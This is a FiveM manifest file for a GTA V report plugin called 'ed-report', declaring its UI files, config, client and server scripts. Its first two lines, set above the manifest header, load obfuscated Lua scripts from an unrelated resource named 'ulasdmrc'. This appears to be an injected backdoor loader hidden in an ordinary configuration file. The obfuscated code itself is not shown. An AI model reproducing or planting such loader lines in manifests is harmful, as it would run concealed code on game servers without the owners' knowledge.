shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

 
fx_version 'adamant'
game 'gta5'
author 'okok#3488'
description 'ed-report'
version '1.1'
ui_page 'web/ui.html'
files {
	'web/*.*',
}
shared_script 'config.lua'
client_scripts {
	'client.lua',
}
server_scripts {
	'server.lua',
}
